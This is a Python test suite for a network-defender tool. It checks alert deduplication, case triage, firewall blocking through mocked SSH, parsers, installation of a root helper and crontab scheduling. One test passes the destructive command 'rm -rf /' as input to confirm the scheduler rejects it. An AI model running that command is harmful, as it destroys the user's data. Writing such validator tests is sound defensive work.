    # --- network
    def test_dual_stack_devices_are_not_one_mac_many_ips(self):
        profile = {"gateways": ["10.0.0.1"], "subnets": ["10.0.0.0/24"], "gateway_macs": {}, "dhcp_servers": []}
        snapshot = {
            "host": "h",
            "links": [{"name": "wlan0", "kind": "wlan", "mac": "00:11:22:33:44:55",
                       "addrs": [{"family": "inet", "address": "10.0.0.20", "prefixlen": 24}]}],
            "routes": [{"gateway": "10.0.0.1", "dev": "wlan0", "family": "ipv4"}],
            "neighbors": [{"ip": "10.0.0.1", "mac": "bb:bb:bb:bb:bb:bb", "dev": "wlan0"},
                          {"ip": "10.0.0.7", "mac": "aa:aa:aa:aa:aa:aa", "dev": "wlan0"},
                          {"ip": "2001:db8::7", "mac": "aa:aa:aa:aa:aa:aa", "dev": "wlan0"},
                          {"ip": "2001:db8::8", "mac": "aa:aa:aa:aa:aa:aa", "dev": "wlan0"}],
            "wifi": {}, "dns": [], "dhcp": [], "gateway_ports": {}}
        findings, _ = G.network_sweep(profile=profile, snapshot=snapshot, save=True)
        self.assertFalse([f for f in findings if f["id"].endswith(":dup")])

    def test_one_bad_baseline_row_does_not_break_every_pass(self):
        G.save_baseline({"initialized": True, "neighbors": {"10.0.0.5": {"mac": 5}}})
        self.assertEqual(G.load_baseline()["neighbors"]["10.0.0.5"]["mac"], "5")

    # --- alerts and triage
    def test_expired_suppression_yields_one_new_alert_not_one_per_repeat(self):
        a, _ = A.raise_alert(severity_="high", title="t", dedup="d1")
        A.suppress(a["id"], ttl=60)
        row = A._replay()[a["id"]]
        row["suppress_until"] = 0
        A._append(row)
        ids = {A.raise_alert(severity_="high", title="t", dedup="d1")[0]["id"] for _ in range(3)}
        self.assertEqual(len(ids), 1)

    def test_ack_reopens_only_on_a_worse_repeat(self):
        a, _ = A.raise_alert(severity_="critical", title="t", dedup="d2")
        A.ack(a["id"])
        self.assertEqual(A.raise_alert(severity_="critical", title="t", dedup="d2")[0]["status"], "ack")
        b, _ = A.raise_alert(severity_="medium", title="u", dedup="d3")
        A.ack(b["id"])
        self.assertEqual(A.raise_alert(severity_="high", title="u", dedup="d3")[0]["status"], "open")

    def test_a_torn_last_line_does_not_swallow_the_next_event(self):
        A.raise_alert(severity_="high", title="t", dedup="d4")
        with open(A.STORE, "a") as fh:
            fh.write('{"id": "A-X", "trunc')
        b, _ = A.raise_alert(severity_="high", title="v", dedup="d5")
        self.assertIsNotNone(A.get(b["id"]))

    def test_escalation_restarts_the_clock_and_cases_only_move_forward(self):
        weak = {"active": False, "priority": "P4", "confidence": 10, "reasons": ["recon"], "kind": "exposure"}
        case, _ = T.open_case("h", [], weak)
        strong = {"active": True, "priority": "P1", "confidence": 90, "reasons": ["ARP spoof"],
                  "kind": "active intrusion"}
        case, created = T.open_case("h", [], strong)
        self.assertFalse(created)
        self.assertEqual(case["priority"], "P1")
        self.assertTrue(case["title"].startswith("ACTIVE INTRUSION"))
        self.assertLess(T._epoch(case["sla_due"]) - __import__("time").time(), 3 * 3600)
        self.assertIsNotNone(T.update_case(case["id"], "contain"))
        self.assertIsNone(T.update_case(case["id"], "ack"))   # contained -> triage is backwards
        self.assertIsNotNone(T.update_case(case["id"], "close"))

    # --- enforcement backends
    def test_nft_table_creation_success_is_success(self):
        calls = iter([(1, "no table"), ])
        with mock.patch.object(E, "_ssh", lambda *a, **k: next(calls)), \
                mock.patch.object(E, "_ssh_script", lambda *a, **k: (0, "")):
            self.assertEqual(E._gateway_nft("root@10.0.0.1"), (True, "nft table ready"))
        with mock.patch.object(E, "_ssh", lambda *a, **k: (1, "")), \
                mock.patch.object(E, "_ssh_script", lambda *a, **k: (1, "syntax error")):
            self.assertFalse(E._gateway_nft("root@10.0.0.1")[0])

    def test_unifi_with_ssh_blocks_ips_through_nft_not_the_api(self):
        seen = []
        with mock.patch.object(E, "_gateway_nft", lambda d: (True, "ready")), \
                mock.patch.object(E, "_nft_element", lambda *a, **k: (seen.append(a) or True, "ok")), \
                mock.patch.object(E, "_api_call", lambda *a, **k: (False, "unifi API does not support")):
            ok, _out, _undo = E.run({"kind": "gateway_block_ip", "ip": "203.0.113.9", "ttl": 600,
                                     "dest": "root@10.0.0.1", "api": {"kind": "unifi", "url": "https://10.0.0.2"}})
        self.assertTrue(ok)
        self.assertTrue(seen)
        self.assertFalse(E.expires("gateway_block_mac", "hostapd"))
        self.assertTrue(E.expires("gateway_block_ip", ""))

    # --- watcher and undo
    def test_a_retired_watcher_pass_never_acts(self):
        import threading
        w = G.Watcher(say=lambda *_: None)
        ev = threading.Event()
        ev.set()
        with mock.patch.object(G, "sweep", lambda *a, **k: ([G._f("brute:203.0.113.9", "high", "logins", "x", "",
                                                                   {"kind": "block_ip", "ip": "203.0.113.9"})], [])), \
                mock.patch.object(D, "_proc_counters", lambda: ({}, {})), \
                mock.patch.object(G, "apply", side_effect=AssertionError("applied from a retired worker")):
            self.assertEqual(w.tick(ev), [])
        self.assertEqual(w.runs, 0)

    def test_a_failed_undo_stays_retryable(self):
        G._journal_add({"host": "h", "act": {"kind": "pause_pid", "pid": 4242}, "ok": True,
                        "undo": {"kind": "resume_pid", "pid": 4242}})
        results = iter([(False, "ssh timeout", None), (True, "resumed", None)])
        with mock.patch.object(G, "execute", lambda *a, **k: next(results)):
            self.assertIn("FAILED", G.undo("last")[0])
            self.assertIn("UNDONE", G.undo("last")[0])

    # --- runner and parsers
    def test_timeout_is_bounded_when_a_child_escapes_the_group(self):
        import time as _t
        t = _t.time()
        rc, _ = D._run(["sh", "-c", "setsid sleep 30 & sleep 100"], timeout=1)
        self.assertEqual(rc, 124)
        self.assertLess(_t.time() - t, 4)

    def test_non_utf8_output_does_not_crash_a_read(self):
        rc, txt = D._run(["printf", "ok \\374\\n"], 5)
        self.assertEqual(rc, 0)
        self.assertIn("ok", txt)

    def test_parsers_edge_cases(self):
        rows = D.parse_tcpdump_dhcp(
            "wlan0 In  de:ad:be:ef:00:02 ethertype IPv4 (0x0800), length 348: (proto UDP (17), length 328)\n"
            "    192.168.1.66.67 > 255.255.255.255.68: BOOTP/DHCP, Reply, length 300\n"
            "\t    DHCP-Message (53), length 1: ACK\n\t    Server-ID (54), length 4: 192.168.1.66\n")
        # ip is the SENDER; the Server-ID it claims rides beside it (QAQC 2026-11-19)
        self.assertEqual(rows, [{"ip": "192.168.1.66", "server_id": "192.168.1.66", "mac": "de:ad:be:ef:00:02",
                                 "type": "ACK"}])
        wifi = D.parse_nmcli_wifi("*:my\\\\:AA\\:BB\\:CC\\:DD\\:EE\\:FF:WPA2:70")
        self.assertEqual((wifi[0]["ssid"], wifi[0]["bssid"]), ("my\\", "aa:bb:cc:dd:ee:ff"))
        pk = D.parse_tshark("10.0.0.1,10.0.0.9\t\t10.0.0.2\t\t1000\t22\t\t\t1\t0\t\t60")
        self.assertEqual(pk[0][0], "10.0.0.1")

    def test_helper_rejects_unicode_digits_junk_allow_and_its_own_router(self):
        h = _helper_module()
        self.assertIsNone(h._num("²", 0, 9))
        for argv in (["block", "8.8.4.4", "²"], ["pause", "²"], ["isolate", "600", "garbage"]):
            with self.assertRaises(SystemExit) as cm:
                h.main(argv)
            self.assertNotEqual(cm.exception.code, 0)
        with mock.patch.object(h, "default_gateways", lambda: {"203.0.113.1"}), \
                mock.patch.object(h, "admin_peers", lambda: set()), \
                mock.patch.object(h, "add_element", side_effect=AssertionError("blocked the gateway")):
            with self.assertRaises(SystemExit):
                h.main(["block", "203.0.113.1", "600"])


class InstallProgress(unittest.TestCase):
    """/defender install reads the target's real state and keeps checking until the helper is ready."""

    def _fake(self, state):
        import hashlib as _h
        src = _h.sha256(open(G.HELPER_SRC, "rb").read()).hexdigest()
        calls = []

        def run(argv, timeout=60):
            calls.append(argv)
            if argv[0] == "stat":
                return (0, state["stat"]) if state.get("stat") else (1, "No such file")
            if argv[0] == "sha256sum":
                return (0, (state.get("hash") or src) + "  x") if state.get("stat") else (1, "")
            if argv[:2] == ["sudo", "-n"]:
                return (0, "helper v3\nno defender table") if state.get("sudo") else (1, "sudo: a password is required")
            return 1, ""
        return run, calls

    def _check(self, state, profile=None):
        run, calls = self._fake(state)
        with mock.patch.object(D, "_run", run), \
                mock.patch.object(D, "_read", lambda p: state.get("protect")):
            return G.install_check(profile or {}), calls

    def test_nothing_installed_never_calls_sudo(self):
        st, calls = self._check({})
        self.assertIs(st[1][0], False)
        self.assertIsNone(st[2][0])
        self.assertFalse([c for c in calls if c[:1] == ["sudo"]], "no auth-log noise before the helper exists")
        text = G.install_hint({}, st)
        self.assertIn("PROGRESS 0/5 done · next: step 1", text)
        self.assertIn("[todo] Step 1.", text)
        self.assertIn("\n\n    sudo install -o root", text)          # the command stands alone, spaced out
        self.assertIn("    expected: ", text)

    def test_partial_install_marks_what_is_done_and_what_is_next(self):
        st, _ = self._check({"stat": "0 755", "protect": "10.0.0.0/24\n"}, {"admin_sources": ["10.0.0.5"]})
        self.assertIs(st[1][0], True)
        self.assertIs(st[2][0], False)
        self.assertIs(st[4][0], True)                                   # 10.0.0.5 is inside 10.0.0.0/24
        self.assertIn("PROGRESS 2/5 done · next: step 2", G.install_hint({}, st))

    def test_stale_or_unsafe_helper_is_not_done(self):
        self.assertIn("OLDER copy", self._check({"stat": "0 755", "hash": "0" * 64})[0][1][1])
        self.assertIn("writable", self._check({"stat": "0 777"})[0][1][1])
        self.assertIn("not owned by root", self._check({"stat": "1000 755"})[0][1][1])

    def test_protect_file_must_cover_recorded_admin_sources(self):
        st, _ = self._check({"stat": "0 755", "sudo": True, "protect": "192.168.9.0/24\n"},
                            {"admin_sources": ["10.0.0.0/24"]})
        self.assertIs(st[4][0], False)
        self.assertIn("10.0.0.0/24", st[4][1])
        self.assertIn("printf '%s\\n' 10.0.0.0/24 | sudo tee", G.install_hint({"admin_sources": ["10.0.0.0/24"]}, st))

    def test_complete_install_is_ready(self):
        st, _ = self._check({"stat": "0 755", "sudo": True, "protect": "10.0.0.0/24\n"})
        self.assertTrue(G.install_done(st))
        self.assertIn("PROGRESS 5/5 done · READY", G.install_hint({}, st))

    def test_watcher_announces_each_step_then_ready(self):
        states = iter([
            {"stat": "0 755"},
            {"stat": "0 755", "protect": "10.0.0.0/24"},
            {"stat": "0 755", "protect": "10.0.0.0/24", "sudo": True},
        ])
        said = []
        seq = [self._check(st)[0] for st in states]
        it = iter(seq)
        start = self._check({})[0]          # computed before install_check is replaced
        w = G.InstallWatch(say=said.append)
        with mock.patch.object(G, "install_check", lambda *a, **k: next(it)):
            w._loop(type("E", (), {"wait": lambda self, t: False, "is_set": lambda self: False})(),
                    {}, None, 0, 60, start)
        text = "\n".join(said)
        self.assertIn("[done] step 1", text)
        self.assertIn("[done] step 4", text)
        self.assertTrue(said[-1].startswith("ROOT HELPER READY"))


if __name__ == "__main__":
    unittest.main()


class ScheduledSweeps20261123(unittest.TestCase):
    """/defender schedule: one marked crontab line the user sets themselves; the model never can (Hermes/OpenClaw lesson:
    jobs that create jobs). Tested on a fake crontab, never the real one."""

    def test_specs(self):
        import gnoc_defender as D
        self.assertEqual(D.schedule_spec("every 30m")[0], "*/30 * * * *")
        self.assertEqual(D.schedule_spec("hourly")[0], "0 * * * *")
        self.assertEqual(D.schedule_spec("daily 03:00")[0], "0 3 * * *")
        self.assertIsNone(D.schedule_spec("every 2m")[0])     # too often for a full sweep
        self.assertIsNone(D.schedule_spec("rm -rf /")[0])

    def test_his_other_lines_are_kept_and_ours_replaced(self):
        import gnoc_defender as D
        cur = "0 1 * * * backup.sh\n* * * * * old " + D.SCHEDULE_MARK + "\n"
        new = D.merge_crontab(cur, "NEW " + D.SCHEDULE_MARK)
        self.assertIn("0 1 * * * backup.sh", new)
        self.assertEqual(new.count(D.SCHEDULE_MARK), 1)
        self.assertNotIn(D.SCHEDULE_MARK, D.merge_crontab(cur, None))
        self.assertIn('chat "/defender sweep"', D.schedule_line("*/30 * * * *", "/x/gnoc"))

    def test_schedule_writes_through_crontab_only(self):
        import gnoc_defender as D
        from unittest import mock
        calls = []

        def fake_run(argv, **kw):
            calls.append((argv, kw.get("input")))
            return mock.Mock(returncode=0, stdout="0 1 * * * backup.sh\n", stderr="")
        with mock.patch.object(D.subprocess, "run", side_effect=fake_run), \
                mock.patch.object(D.shutil, "which", return_value="/usr/bin/crontab"):
            out = D.schedule("every 30m")
        self.assertIn("scheduled: a headless defender sweep every 30 minutes", out)
        written = calls[-1][1]
        self.assertIn("0 1 * * * backup.sh", written)
        self.assertIn("*/30 * * * *", written)

    def test_the_model_cannot_schedule(self):
        import inspect
        from gnoc_tools import defend
        src = inspect.getsource(defend.t_defend)
        self.assertNotIn("schedule(", src)


class Summary20261124(unittest.TestCase):
    """Defense batch 15: "can I get a weekly summary of what the defender did" searched ~ for 4 minutes."""

    def test_the_summary_reads_the_journal_and_alerts(self):
        import gnoc_defender as D
        from unittest import mock
        rows = [{"id": "d1", "ts": "2099-01-01T10:00:00", "ok": True, "auto": True, "act": {"kind": "block"},
                 "out": "blocked 203.0.113.9"},
                {"id": "d0", "ts": "2000-01-01T10:00:00", "ok": True, "auto": True, "act": {"kind": "block"}}]
        with mock.patch.object(D, "journal", return_value=rows), \
                mock.patch("gnoc_alerts._replay", return_value={}):
            out = D.summary(7)
        self.assertIn("1 done (1 on its own", out)
        self.assertIn("blocked 203.0.113.9", out)
        self.assertNotIn("d0", out)


class OneFirewallManager20261124(unittest.TestCase):
    """Defense batch 17: an unreadable firewall became `sudo systemctl enable --now nftables` beside an active ufw."""

    def test_nftables_off_beside_ufw_is_normal(self):
        import gnoc_defend as D
        import gnoc_modes
        from unittest import mock

        def fake(argv, _t):
            unit, what = argv[-1], argv[1]
            table = {("ufw", "is-active"): "active", ("ufw", "is-enabled"): "enabled",
                     ("nftables", "is-active"): "inactive", ("nftables", "is-enabled"): "disabled"}
            return 0, table.get((unit, what), "")
        with mock.patch.object(D, "_run", side_effect=fake):
            known = D.firewall_known()
        self.assertTrue(any("NORMAL with ufw active" for k in known))
        self.assertIn("never advise it", gnoc_modes.defend_rule_for("should I enable nftables"))
